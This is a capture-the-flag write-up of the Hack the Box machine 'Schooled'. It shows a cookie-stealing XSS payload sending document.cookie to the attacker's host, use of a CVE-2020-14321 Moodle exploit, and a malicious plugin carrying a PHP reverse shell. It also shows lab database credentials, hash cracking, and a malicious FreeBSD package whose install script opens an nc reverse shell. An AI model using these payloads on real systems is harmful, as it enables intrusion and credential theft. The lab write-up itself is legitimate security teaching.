+++
author = "Nick"
categories = ["hack the box", "freeBSD", "CVE-2020-14321", "moodle", "reverse shell"]
date = 2021-09-11T23:56:23Z
description = ""
draft = false
thumbnail = "/images/2021/07/school.png"
slug = "hack-the-box-schooled"
tags = ["hack the box", "freeBSD", "CVE-2020-14321", "moodle", "reverse shell"]
title = "Hack the Box - Schooled"
url = "/hack-the-box-schooled"

+++


Welcome back! Today's write-up is the Hack the Box machine - Schooled. This machine is listed as a Medium FreeBSD machine. Let's dive in!

As usual, we start with our `nmap` scan. Here are our results:

```
Nmap scan report for 10.10.10.234
Host is up (0.044s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=7/19%Time=60F5B4D6%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

We see a few things here. Some standard ports and some non-standard ports. Let's see what's being hosted on port 80. We are greeted with a School site of some type. The site gives us an email and hostname: `admissions@schooled.htb`, let's add this hostname to our `hosts` file. Also while browsing the site we get a list of four teachers. This could be useful later if we can enumerate the email scheme or something along those lines.

Next up, we'll start some enumeration. We want to enumerate potential subdomains as well as additional directories. First, subdomains. We'll use `ffuf` to try and find some. If we do find some and feel like there is more, we can look at expanding the enumeration mechanics.

Command:
`ffuf -u http://schooled.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.schooled.htb' -fs 20750 `

Now in the above case, we are using the `-fs` command to hid entries that have a size of 20750. The reason we do this is because all of the subdomains will come back as code 200, but have that size, essntially making them bad.

![](/images/2021/07/image-21.png" caption="Everything is 200, but has a 'bad' size')

![](/images/2021/07/image-22.png" caption="After hiding the 'bad' sizes)

As we see above, we only have one host that shows up - `moodle`. We'll also add this to our hosts list and see what it might be hosting. When we browse to this virtual host, we see a course offering system.

![](/images/2021/07/image-23.png)

It looks like we have the ability to create an account and login. Before we do that, we'll search to see if there are any known vulnerabilities for this platform. Turns out there are [quite a few](https://www.cvedetails.com/vulnerability-list/vendor_id-2105/product_id-3590/Moodle-Moodle.html). Many of them require some form of authentication. So we'll continue to make our account.

Now when trying to create and account we're told that the email must be created as `username@student.schooled.htb`. We'll add this hostname to our hostfile as well, just in case (it simply redirects us to the normal web inteface found above).

Once our account is created, we have access to the moodle interface. As we look around inside, we have the ability to upload files to a Private Files section. This could be handy. 

As we continue to look around the site, we are only able to enroll in one class - Mathematics. So we enroll and start looking through the class information and find an interesting comment in the Announcements.

![](/images/2021/07/image-24.png)

Our instructor will be checking all of our profiles before the class begins. This is a common CTF item, we should look to find some kind of XSS in our profile page, so that when our professor views our page, it will trigger and we can scrape his cookies or some kind of other useful data.

Here's a good XSS Cheat Sheet to help us find one that will work - [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

We'll head back to our profile and try to find a field that we can inject in. Luckily for us, that field is pointed out based on what we've read:

![](/images/2021/07/image-25.png)

So now I'll use a basic injection to see what might come up - `onerror`.

![](/images/2021/07/image-26.png)

We'll save it in our `MoodleNet profile` location and see what happens when we save it.

![](/images/2021/07/schooled_xss_test.gif)

Now that we know the XSS will work, let's modify this exploit a bit. We know we want the cookie data. So let's simply have the injection send that data to a server we are hosting. First we'll start up a listener on our local machine.

Command:
`python -m SimpleHTTPServer 8080`

Next we'll insert our newly crafted XSS:

```javascript
<script>
document.write('<img src="http://10.10.14.70:8080?cookie='+document.cookie+'" />');
</script>
```

Then we wait for our instructor to view our profile. In this machines case it's every two minutes.

![](/images/2021/07/image-27.png)

Now that we have the session cookies, we can modify our current cookies with these and gain the priviledges of this user! Simply open up the Developer Tools, navigate to Storage and modify the value in the `moodle.schooled.htb` location. Refresh and we should now have Manuel's account!

![](/images/2021/07/image-28.png)

![](/images/2021/07/image-29.png)

Now we can start looking around under this account. Nothing too new here. Some googling around turns up [CVE-2020-14321](https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-14321). Luckily for us, there's a few [PoC](https://github.com/lanzt/CVE-2020-14321) to go with it! This exploit let's us escalate from a Teacher role to a Manager role.

Let's clone the repo.

Command:
`git clone https://github.com/lanzt/CVE-2020-14321`

Now we can use the cookie value we snagged earlier. We'll also supply a basic command to verify the PoC works.

Command:
`python3 CVE-2020-14321_RCE.py http://moodle.schooled.htb/moodle --cookie skntaegbc0s8f2ar55tcgsumqv`

Once we run our PoC, we can navigate to our enrolled users and fine Lianne Carter. We then login as this user.

![](/images/2021/07/image-30.png)

Now we can upload our own `PHP Shell` to call back to our system. The referenced RCE.zip is in linked in the repo - https://github.com/HoangKien1020/Moodle_RCE.
We need to modify this file with a reverse shell of your choice. I tend to use the basic Pentest Monkey shell.

So we unzip the `rce.zip`. Then we modify the contents of `rce/lang/en/block_rce.php` to have the contents of our prefered shell. Now we need to upload it. We'll head over to Site Administration > Plugins.

![](/images/2021/07/image-33.png)

Now we can 'Install plugins'. We can then upload the file from our local machine and install it.

![](/images/2021/07/image-31.png)

We click continue once it's installed. Before we click through the pre-requisite checks, we want to be sure we have a listener open for our shell. Once we do, click continue and you should see the listener light up.

![](/images/2021/07/image-32.png)

It doesn't look like `Python` is installed so we can't stabalize the shell that way. Fine. We'll atleast start some internal enumeration. We transfer over `linpeas.sh` using `fetch`.

Command:
`fetch -o /tmp/x.sh http://10.10.14.70/linpeas.sh`

We then make it executable, then run it.

We pretty quickly see a set of credentials:

![](/images/2021/07/image-34.png)

Credentials: `moodle`|`PlaybookMaster2020`, these creds are for the `mysql` instance. So now, we can try to access the databases here and see what we can find. I found that maintaining a continuous connection inside the mysql instance was causing some flakey connections, so we'll issue the commands outside of the instance.

Command:
`
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'`

![](/images/2021/07/image-35.png)

Now we need to show the tables in the `moodle` database.

Command:
`/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show tables from moodle;'`

![](/images/2021/07/image-36.png)

There are quite a few tables, the one of interest is `mdl_user`. Let's see that.

Command:
`/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle;select * from mdl_user;'`

![](/images/2021/07/image-37.png)

This gives us a bunch of users as well as hashes! Let's copy these back to our machine. We see a total of 28 users. Only one of them is an admin: Jamie

![](/images/2021/07/image-38.png)

We'll just extract his hash, and put it into a file for cracking.

Command:
`john jamie_hash -w=/usr/share/wordlists/rockyou.txt`

![](/images/2021/07/image-39.png)

About a minute later, we have a password - `!QAZ2wx`. Let's try to use this password to `SSH` into the box.

Command:
`ssh jamie@10.10.10.234`

We're in!

![](/images/2021/07/image-40.png)

Now that we're on the box, we can start enumerating more. As usual, we run the `sudo -l` command to see if there are any dead giveaways. Sure enough, we have something:

![](/images/2021/07/image-41.png)

A quick attempt at the exploit listed on [GTFObins](https://gtfobins.github.io/gtfobins/pkg/) is a no go. Some additional searching about custom `pkgs` lead me [here](http://lastsummer.de/creating-custom-packages-on-freebsd/) and [here](https://github.com/freebsd/pkg#pkgfmt). We can almost copy paste the steps we need to follow in order to create our own package. We just need to change our command slightly so we can get a reverse shell. 

```bash
#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
echo "Resetting root shell"
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.70 5050 >/tmp/f
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
echo "Registering root shell"
pw usermod -n root -s /bin/sh
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

As you can see in our script, we took the first two parts, put them together, then the last step of building the package and appended it on the end. We can run this script and we get our package output of `mypackage-1.0_5.txz`. Now we can start up our shell listener.

Command:
`nc -lvnp 5050`

Now we can run our priviledged package commands.

Command:
`sudo /usr/sbin/pkg install -U *.txz`

If we don't use the `-U` command, it will time out.

Now this should give us a shell back. However, when I tried to replicate the steps a my second time through the box, I wasn't able to. So to improvise, I simply modified my above script to get the `root.txt` flag and copy it to `/tmp`. This is that script:

```bash
#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_DEINSTALL <<EOF
echo "Resetting root shell"
cat /root/root.txt > /tmp/key
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
echo "Registering root shell"
pw usermod -n root -s /bin/sh && cat /root/root.txt > /tmp/key
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_6"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

We re-run the script and the `pkg` command and get our flag!

![](/images/2021/07/schooled_Root.gif)

I'll attempt to regain a reverse shell when we're closer to this box being retired. 

Hopefully something was learned in this box!



